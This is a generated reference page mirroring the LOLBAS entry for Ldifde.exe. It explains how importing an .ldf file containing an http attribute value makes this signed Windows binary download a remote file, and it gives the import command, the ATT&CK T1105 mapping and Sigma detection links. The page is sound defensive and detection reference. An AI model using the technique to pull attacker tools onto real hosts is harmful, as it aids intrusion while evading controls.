---
title: "Ldifde.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Ldifde.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ldifde.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Ldifde.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Creates, modifies, and deletes LDAP directory objects.

## Paths

- `c:\windows\system32\ldifde.exe`
- `c:\windows\syswow64\ldifde.exe`

## Commands

### 1. Download

Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.

```cmd
Ldifde -i -f {PATH:.ldf}
```

- Use Case: Download file from Internet
- Privileges: Administrator
- Operating System: Windows Server with AD Domain Services role,  Windows 10 with AD LDS role.
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_export.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml

## Resources

- {'Link': 'https://twitter.com/0gtweet/status/1564968845726580736'}

## Acknowledgements

- {'Person': 'Grzegorz Tworek', 'Handle': '@0gtweet'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ldifde.yml)
